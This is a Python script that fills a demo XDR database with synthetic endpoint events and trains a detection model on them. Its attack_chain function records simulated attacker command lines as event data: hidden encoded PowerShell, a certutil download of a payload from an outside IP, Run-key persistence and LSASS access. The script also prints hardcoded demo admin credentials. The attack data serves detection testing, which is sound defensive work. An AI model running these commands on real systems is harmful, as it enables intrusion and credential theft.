from __future__ import annotations

import argparse
import json
import os
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path
from uuid import uuid4

HOSTS = ["DEMO-PC-01", "DEMO-PC-02"]
BENIGN_IMAGES = [
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "C:\\Windows\\System32\\conhost.exe",
    "C:\\Windows\\explorer.exe",
    "C:\\Program Files\\Microsoft VS Code\\Code.exe",
    "C:\\Windows\\System32\\SearchProtocolHost.exe",
]
DOMAINS = ["www.google.com", "login.microsoftonline.com", "github.com", "update.code.visualstudio.com"]


def _event(host: str, ts: datetime, event_type: str, data: dict) -> dict:
    return {
        "event_id": f"demo:{uuid4()}",
        "timestamp": ts.isoformat().replace("+00:00", "Z"),
        "event_type": event_type,
        "source": "edr",
        "host_id": host,
        "severity": "info",
        "raw": {"source": "sysmon", "event_type": event_type, "computer": host, "data": data, "demo": True},
    }


def benign_window(rng: random.Random, host: str, start: datetime) -> list[dict]:
    def at() -> datetime:
        return start + timedelta(seconds=rng.randint(0, 299))

    events = []
    busy = rng.random() < 0.3  # some windows are busier (user active)
    for _ in range(rng.randint(0, 8 if busy else 3)):
        image = rng.choice(BENIGN_IMAGES)
        events.append(_event(host, at(), "process_create", {
            "Image": image, "CommandLine": f"\"{image}\" --type=renderer",
            "ParentImage": "C:\\Windows\\explorer.exe"}))
    if rng.random() < 0.05:  # an admin occasionally opens PowerShell
        events.append(_event(host, at(), "process_create", {
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe", "ParentImage": "C:\\Windows\\explorer.exe"}))
    for _ in range(rng.randint(0, 25 if busy else 6)):
        events.append(_event(host, at(), "network_connect", {
            "DestinationIp": rng.choice(["10.0.0.5", "142.250.4.100", "20.190.1.10", "140.82.112.3"]),
            "DestinationPort": rng.choice(["443", "443", "443", "80"])}))
    for _ in range(rng.randint(0, 12 if busy else 3)):
        events.append(_event(host, at(), "dns_query", {"QueryName": rng.choice(DOMAINS)}))
    for _ in range(rng.randint(0, 6)):
        events.append(_event(host, at(), "file_create", {
            "TargetFilename": f"C:\\Users\\demo\\AppData\\Local\\Temp\\{uuid4().hex[:8]}.tmp"}))
    for _ in range(rng.randint(0, 4)):
        events.append(_event(host, at(), "registry_set", {"TargetObject": "HKCU\\Software\\Demo\\Settings\\Theme"}))
    return events


def attack_chain(host: str, start: datetime) -> list[dict]:
    """Phishing document -> encoded PowerShell -> download -> persistence -> LSASS -> scan."""
    t = lambda seconds: start + timedelta(seconds=seconds)  # noqa: E731
    events = [
        _event(host, t(10), "process_create", {
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"}),
        _event(host, t(25), "dns_query", {"QueryName": "xk7q2vz9mfl3.top"}),
        _event(host, t(30), "process_create", {
            "Image": "C:\\Windows\\System32\\certutil.exe",
            "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.9/upd.exe C:\\Users\\Public\\upd.exe",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe"}),
        _event(host, t(45), "file_create", {"TargetFilename": "C:\\Users\\Public\\upd.exe"}),
        _event(host, t(60), "process_create", {
            "Image": "C:\\Users\\Public\\upd.exe", "CommandLine": "upd.exe -s",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe"}),
        _event(host, t(75), "registry_set", {
            "TargetObject": "HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"}),
        _event(host, t(90), "process_access", {
            "SourceImage": "C:\\Users\\Public\\upd.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": "0x1010"}),
        _event(host, t(100), "process_create", {
            "Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami /all",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe"}),
    ]
    for port in (21, 22, 23, 135, 139, 445, 1433, 3306, 3389, 5985, 8080):
        for last_octet in range(10, 16):
            events.append(_event(host, t(120 + port % 60), "network_connect", {
                "DestinationIp": f"10.0.0.{last_octet}", "DestinationPort": str(port)}))
    return events


def main() -> None:
    parser = argparse.ArgumentParser(description="Create a synthetic demo database and model")
    parser.add_argument("--db", type=Path, default=Path("data/demo.sqlite3"))
    parser.add_argument("--model", type=Path, default=Path("data/demo_model.joblib"))
    parser.add_argument("--hours", type=int, default=24, help="Hours of benign history to generate")
    parser.add_argument("--seed", type=int, default=42)
    args = parser.parse_args()
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # Windows consoles default to cp1252

    if args.db.exists():
        args.db.unlink()  # demo DB is always rebuilt from scratch
    os.environ["XDR_DATABASE_PATH"] = str(args.db)
    os.environ["XDR_AI_MODEL_PATH"] = str(args.model)

    # Imported after the environment points at the demo files.
    from ai.analyzer import analyze_pending
    from ai.datasets import iter_db_events
    from ai.detector import save_model, train_model
    from ai.features import group_windows, window_features
    from database.database import db_session, init_db, save_event_with_alerts
    from ingestion import detect_event, load_detection_content

    init_db()
    rng = random.Random(args.seed)
    now = datetime.now(timezone.utc).replace(microsecond=0)
    current_window = now - timedelta(seconds=int(now.timestamp()) % 300)
    history_start = current_window - timedelta(hours=args.hours)
    train_until = current_window - timedelta(hours=2)
    attack_start = current_window - timedelta(minutes=20)

    benign = []
    start = history_start
    while start < current_window - timedelta(minutes=5):
        for host in HOSTS:
            if not (host == HOSTS[0] and start == attack_start):
                benign.extend(benign_window(rng, host, start))
        start += timedelta(minutes=5)
    with db_session() as connection:
        connection.executemany(
            """INSERT INTO events (event_id, timestamp, event_type, source, host_id, severity, raw_json)
            VALUES (?, ?, ?, ?, ?, ?, ?)""",
            [(e["event_id"], e["timestamp"], e["event_type"], e["source"], e["host_id"], e["severity"],
              json.dumps(e["raw"])) for e in benign],
        )

    # Train on benign history only; the last 2 hours stay unseen by the model.
    training_events = list(iter_db_events(args.db, until=train_until.isoformat()[:19]))
    rows = [window_features(events) for events in group_windows(training_events).values()]
    bundle = train_model(rows, target_fpr=0.01)
    bundle["hosts"] = HOSTS
    bundle["demo"] = True
    save_model(bundle, args.model)

    rules, iocs = load_detection_content()
    attack = attack_chain(HOSTS[0], attack_start)
    for event in attack:
        save_event_with_alerts(event, detect_event(event, rules, iocs))

    result = analyze_pending(now=now, lookback_minutes=120, grace_seconds=60)

    print("=== DEMO READY (synthetic data, not for evaluation) ===")
    print(f"Benign events: {len(benign)}  | attack events: {len(attack)} on {HOSTS[0]} at {attack_start:%H:%M} UTC")
    print(f"Model: {bundle['version']} trained on {bundle['training_windows']} windows -> {args.model}")
    print(f"AI run: {result}")
    print("\nStart the server on the demo files (PowerShell, in the backend folder):")
    print(f'  $env:XDR_DATABASE_PATH="{args.db}"; $env:XDR_AI_MODEL_PATH="{args.model}"; '
          '$env:XDR_AGENT_KEY="demo-agent-key"; '
          '$env:XDR_BOOTSTRAP_ADMIN_USERNAME="admin"; $env:XDR_BOOTSTRAP_ADMIN_PASSWORD="demo-password-123"')
    print("  ..\\.venv\\Scripts\\uvicorn main:app --port 8000")
    print("Then open http://127.0.0.1:8000/dashboard/ (admin / demo-password-123) and go to 'AI phát hiện'.")


if __name__ == "__main__":
    main()
